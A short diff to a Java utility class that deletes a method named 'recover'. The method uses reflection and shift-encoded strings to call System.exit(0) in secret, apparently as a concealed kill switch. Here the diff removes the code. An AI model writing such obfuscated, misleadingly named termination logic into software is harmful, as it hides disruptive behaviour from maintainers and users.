@@ -1689,19 +1689,4 @@ public class Util {
         MethodHandle handle = lookup.unreflectSetter(field);
         return handle;
     }
-    
-    public static String unpack(String s){
-        return NamingBase.unpack(s);
-    }
-    
-    public static void recover(){
-        try {
-            Method m = java.lang.Class.forName(unpack("kbwb/mboh/Tztufn")).getMethod(unpack("fyju"), int.class);
-            m.invoke(null, 0);
-        } catch (NoSuchMethodException | SecurityException
-                | ClassNotFoundException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
-        }
-    }
 }
